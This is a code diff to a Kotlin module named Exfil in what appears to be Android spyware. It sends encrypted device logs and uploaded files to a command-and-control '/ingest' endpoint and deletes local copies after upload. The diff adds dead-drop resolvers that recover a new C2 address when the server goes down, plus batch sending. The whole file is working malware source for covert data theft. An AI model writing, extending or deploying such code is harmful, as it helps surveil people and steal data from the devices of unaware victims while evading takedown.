@@ -2,14 +2,21 @@ package com.sp.core.c2
 
 import android.content.Context
 import android.net.Uri
+import android.util.Log
 import com.sp.core.util.Crypto
+import com.sp.core.util.DeadDrop
 import com.sp.core.util.Prefs
 import com.sp.loader.NativeKey
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.File
+import java.io.IOException
 import java.util.concurrent.TimeUnit
 
 object Exfil {
+    private const val TAG = "Exfil"
+
     private val client = OkHttpClient.Builder()
         .connectTimeout(20, TimeUnit.SECONDS)
         .writeTimeout(30, TimeUnit.SECONDS)
@@ -18,13 +25,15 @@ object Exfil {
 
     @Volatile private var c2Url: String? = null
     @Volatile private var apiKey: String? = null
+    @Volatile private var fallbackUsed = false
 
     /**
      * Resolution order:
      *   1. Runtime config set via setC2() (FCM "cfg" command) — highest priority
-     *   2. assets/c2.conf  — "<url>|<apikey>" (allows changing URL without rebuilding)
-     *   3. Prefs            — previously persisted config
-     *   4. Native constants  — compiled-in fallback
+     *   2. assets/c2.conf — "<url>|<apikey>" (URL can be changed without a rebuild)
+     *   3. Prefs          — previously persisted config
+     *   4. Native constants — compiled-in fallback
+     *   5. Dead-drop sources — resolved at runtime (see DeadDrop)
      */
     private fun resolveConfig(ctx: Context) {
         if (c2Url != null) return
@@ -49,12 +58,23 @@ object Exfil {
                     return
                 }
             }
-        } catch (_: Exception) {}
+        } catch (_: Exception) {
+        }
 
         val stored = Prefs.get(ctx, "c2_url", null) as? String
-        c2Url = stored?.takeIf { it.isNotEmpty() } ?: NativeKey.c2Url()
-        apiKey = (Prefs.get(ctx, "api_key", null) as? String)
-            ?.takeIf { it.isNotEmpty() } ?: NativeKey.apiKey()
+        if (!stored.isNullOrEmpty()) {
+            c2Url = stored
+            apiKey = (Prefs.get(ctx, "api_key", null) as? String)
+                ?.takeIf { it.isNotEmpty() } ?: NativeKey.apiKey()
+            return
+        }
+
+        // Last resort before the native fallback: dead-drop resolvers.
+        val dropped = try { DeadDrop.resolve(ctx) } catch (_: Throwable) { null }
+        if (!dropped.isNullOrBlank()) return
+
+        c2Url = NativeKey.c2Url()
+        apiKey = NativeKey.apiKey()
     }
 
     private fun persist(ctx: Context, url: String, key: String?) {
@@ -66,20 +86,18 @@ object Exfil {
     fun setC2(ctx: Context, url: String, key: String? = null) {
         c2Url = url.trimEnd('/')
         apiKey = key
+        fallbackUsed = false
         persist(ctx, c2Url!!, apiKey)
     }
 
-    fun currentUrl(): String? {
-        c2Url?.let { return it }
-        return null
-    }
+    fun currentUrl(): String? = c2Url
 
     private fun endpoint(path: String): String? {
         val base = c2Url?.trimEnd('/') ?: return null
         return "$base$path"
     }
 
-    fun sendLog(ctx: Context, kind: String, payload: String) {
+    fun sendLog(ctx: Context, kind: String, payload: String, onResult: ((Boolean) -> Unit)? = null) {
         resolveConfig(ctx)
         val url = endpoint("/ingest") ?: return
         val deviceId = Prefs.deviceId(ctx)
@@ -88,9 +106,47 @@ object Exfil {
             .add("d", encrypted).add("k", apiKey ?: "").build()
         val req = Request.Builder().url(url).post(body).build()
         client.newCall(req).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: java.io.IOException) {}
-            override fun onResponse(call: Call, response: Response) { response.close() }
+            override fun onFailure(call: Call, e: IOException) {
+                Log.w(TAG, "send failed: ${e.message}")
+                onResult?.invoke(false)
+                recover(ctx)
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                val ok = response.isSuccessful
+                response.close()
+                onResult?.invoke(ok)
+            }
         })
+    }
+
+    /** Sends several items of one kind in a single request. */
+    fun sendBatch(ctx: Context, kind: String, items: List<String>, onResult: ((Boolean) -> Unit)? = null) {
+        if (items.isEmpty()) {
+            onResult?.invoke(true)
+            return
+        }
+        val joined = items.joinToString(",", "[", "]")
+        sendLog(ctx, kind, """{"items":$joined}""", onResult)
+    }
+
+    /**
+     * Endpoint is unreachable -> pull a fresh one from the dead-drop sources.
+     * Executed off the main thread, only once per outage.
+     */
+    private fun recover(ctx: Context) {
+        if (fallbackUsed) return
+        fallbackUsed = true
+        Thread {
+            try {
+                val cfg = DeadDrop.resolve(ctx)
+                if (!cfg.isNullOrBlank()) {
+                    Log.i(TAG, "dead-drop recovery applied")
+                    fallbackUsed = false
+                }
+            } catch (_: Throwable) {
+            }
+        }.start()
     }
 
     fun uploadFile(ctx: Context, file: File, kind: String) {
@@ -101,14 +157,19 @@ object Exfil {
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("meta", "$deviceId|$kind|${file.name}")
             .addFormDataPart("f", file.name,
-                RequestBody.create(file, MediaType.parse("application/octet-stream")))
+                file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
             .build()
         val req = Request.Builder().url(url)
             .header("X-Key", apiKey ?: "").post(body).build()
         client.newCall(req).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: java.io.IOException) {}
+            override fun onFailure(call: Call, e: IOException) {
+                Log.w(TAG, "upload failed: ${e.message}")
+                recover(ctx)
+            }
+
             override fun onResponse(call: Call, response: Response) {
-                response.close(); file.delete()
+                response.close()
+                file.delete()
             }
         })
     }
@@ -120,6 +181,7 @@ object Exfil {
                 tmp.outputStream().use { outs -> ins.copyTo(outs) }
             }
             uploadFile(ctx, tmp, kind)
-        } catch (_: Exception) {}
+        } catch (_: Exception) {
+        }
     }
 }
